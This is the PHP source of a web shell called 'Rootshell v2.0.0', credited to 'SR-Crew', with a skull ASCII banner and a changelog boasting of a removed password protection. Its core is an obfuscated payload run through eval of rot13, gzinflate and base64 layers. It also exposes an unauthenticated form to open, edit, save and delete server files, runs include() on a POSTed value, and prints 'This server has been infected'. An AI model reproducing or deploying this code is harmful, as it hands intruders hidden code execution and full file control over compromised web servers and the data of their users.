<!--
/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
/*  ................jdWMMMMMNk&,...JjdMMMHMMHA+................ */
/*  .^.^.^.^.^.^..JdMMMBC:vHMMNI..`dMMM8C`ZMMMNs...^^.^^.^^.^^. */
/*  ..^.^..^.....dMMMBC`....dHNn...dMNI....`vMMMNy.........^... */
/*  .....^..?XMMMMMBC!..dMM@MMMMMMM#MMH@MNZ,^!OMMHMMNk!..^...^. */
/*  ^^.^..^.`??????!`JdN0??!??1OUUVT??????XQy!`??????!`..^..^.^ */
/*  ..^..^.....^..^..?WN0`` `  +llz:`    .dHR:..^.......^..^... */
/*  ...^..^.^.^..^...`?UXQQQQQeyltOOagQQQeZVz`..^.^^..^..^..^.. */
/*  ^.^..^..^..^..^.^..`zWMMMMH0llOXHMMMM9C`..^.....^..^..^..^. */
/*  ..^..^...^..+....^...`zHHWAwtltwAXH8I....^...?+....^...^..^ */
/*  ...^..^...JdMk&...^.^..^zHNkAAwWMHc...^.....jWNk+....^..^.. */
/*  ^.^..^..JdMMMMNHo....^..jHMMMMMMMHl.^..^..jWMMMMNk+...^..^. */
/*  .^....jdNMM9+4MMNmo...?+zZV7???1wZO+.^..ddMMM6?WMMNmc..^..^ */
/*  ^.^.jqNMM9C!^??UMMNmmmkOltOz+++zltlOzjQQNMMY?!`??WMNNmc^.^. */
/*  ummQHMM9C!.uQo.??WMMMMNNQQkI!!?wqQQQQHMMMYC!.umx.?7WMNHmmmo */
/*  OUUUUU6:.jgWNNmx,`OUWHHHHHSI..?wWHHHHHW9C!.udMNHAx.?XUUUU9C */
/*  .......+dWMMMMMNm+,`+ltltlzz??+1lltltv+^.jdMMMMMMHA+......^ */
/*  ..^..JdMMMMC`vMMMNkJuAAAAAy+...+uAAAAA&JdMMMBC`dMMMHs....^. */
/*  ....dMMMMC``.``zHMMMMMMMMMMS==zXMMMMMMMMMM8v``.`?ZMMMNs.... */
/*  dMMMMMBC!`.....`!?????1OVVCz^^`+OVVC??????!`....^`?vMMMMMNk */
/*  ??????!`....^.........?ztlOz+++zlltz!........^.....???????! */
/*  .....^.^^.^..^.^^...uQQHkwz+!!!+zwWHmmo...^.^.^^.^..^....^. */
/*  ^^.^.....^.^..^...ugHMMMNkz1++++zXMMMMHmx..^....^.^..^.^..^ */
/*  ..^.^.^.....^...jdHMMMMM9C???????wWMMMMMHn+...^....^..^..^. */
/*  ^....^.^.^....JdMMMMMMHIz+.......?zdHMMMMMNA....^..^...^..^ */
/*  .^.^....^...JdMMMMMMHZttOz1111111zlttwWMMMMMNn..^.^..^..^.. */
/*  ..^.^.^....dNMMMMMWOOtllz!^^^^^^^+1lttOZWMMMMMNA,....^..^.. */
/*  ^....^..?dNMMMMMC?1ltllllzzzzzzzzzlllltlz?XMMMMNNk+^..^..^. */
/*  .^.^..+dNMM8T77?!`+lllz!!!!!!!!!!!!+1tll+`??777HMNHm;..^..^ */
/*  ..^..^jHMMNS`..^.`+ltlz+++++++++++++ztll+`....`dMMMHl.^..^. */
/*  ....^.jHMMNS`^...`+ltlz+++++++++++++zltl+`^.^.`dMMMHl..^..^ */
/*  ^^.^..jHMMNS`.^.^`+tllz+...........?+ltl+`.^..`dMMMHl...^.. */
/*  ..^..^jHMMM6`..^.`+lltltltlz111zltlltlll+`...^`dMMMHl.^..^. */
/*  ....^.jHNC``.^...`+zltlltlz+^^.+zltlltzz+`..^.^`?dMHl..^..^ */
/*  .^.^..jHNI....^..^``+zltltlzzzzzltltlv!``.^...^..dMHc....^. */
/*  ^...jdNMMNmo...^...^`?+ztlltllltlltz!``..^.^...dqNMMNmc.^.. */
/*  .^.`?7TTTTC!`..^.....^`?!!!!!!!!!!!!`..^....^.`?7TTTTC!..^. */
/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
/*
/*    We should take care some kind of history, i will add here to keep a trace of changes (who made it).
/*    Also I think we should increase the last version number by 1 if you make some changes.
/*
/*    CHANGES / VERSION HISTORY:
/*    ====================================================================================
/*    Version        Nick            Description
/*    - - - - - - - - - - - - - - - - - - - - - - - - - - -
/*    0.3.1          666            added an ascii bug :)
/*    0.3.1          666            password protection
/*    0.3.1          666            GET and POST changes
/*    0.3.2          666            coded a new uploader
/*    0.3.2          666            new password protection
/*    0.3.3          666            added a lot of comments :)
/*    0.3.3          666            added "Server Info"
/*    1.0.0          666            added "File Inclusion"
/*    1.0.0          666            removed password protection (nobody needs it...)
/*    1.0.0          666            added "Files & Directories"
/*    1.3.3          666            added "File Editor"
/*    2.0.0          666            added "Notices"
/*    2.0.0          666            added some new modules
/*    2.0.0          666            made some design updates
/*
/*
-->
<?
//
// Default Changes
//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

$owner        = "SR-Crew";                                                      // Insert your nick
$version      = "2.0.0";                                                        // The version    

//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
//
?>

<body link="#000000" vlink="#000000" alink="#000000" bgcolor="#FFFFD5">
<style type="text/css">
body{
cursor:crosshair 
}
</style>
<div align="center" style="width: 100%; height: 100">
<pre width="100%" align="center"><strong> ____             _         ____  _          _ _
|  _ \ ___   ___ | |_      / ___|| |__   ___| | |
| |_) / _ \ / _ \| __|     \___ \| '_ \ / _ \ | |
|  _ < (_) | (_) | |_   _   ___) | | | |  __/ | |
|_| \_\___/ \___/ \__| (_) |____/|_| |_|\___|_|_|</pre>
</div></strong>
<b><u><center><font face='Verdana' style='font-size: 8pt'><?php echo "This server has been infected by $owner"; ?></font></center></u></b>
<hr color="#000000" size="2,5">

<div align="center">
  <center>
  <p>
  <?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>
<table border="0" align="center">
		
		<tr>
			<td>
				<table width="100%" border="0">
				<tr>
					<td>
						<form method="post" action="<?echo $scriptname;?>">
							<input name="filename" type="text" value="<?echo $filename;?>" size="20">
							<input type="submit" name="submit" value="Open">
							<input type="submit" name="submit" value="Delete">
					</td>
				</tr>
				</table>
			</td>
		</tr>

		<tr>
			<td>
					<font face="Verdana" style="font-size: 11pt">
					<textarea name="contents" cols="53" rows="8"><?echo $filecontents;?></textarea></font><br>
					<input type="submit" name="submit" value="Save">
					<input type="reset" value="Reset">
				</form>
			</td>
		</tr>

		<tr>
			<td>
				<h2><?echo $status;?></h2>
			</td>
		</tr>
		</table>				</td>
      <td width="51%" height="232">
      <p align="center"><font face="Verdana" style="font-size: 8pt"><br>
<textarea rows="13" cols="55"></textarea><br>
      &nbsp;</font><?php @$output = include($_POST['incl']); ?></td>
    </tr>
  </table>
  </center>
</div>
<br /></p>
<div align="center">
  <center>
  <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber2">
    <tr>
      <td width="100%" bgcolor="#FCFEBA" height="20">
      <p align="center"><font face="Verdana" size="2">Rootshell v<?php echo "$version" ?>  � 2006 by <a style="text-decoration: none" target="_blank" href="http://www.SR-Crew.de.tt">SR-Crew</a> </font></td>
    </tr>
  </table>
  </center>
</div>
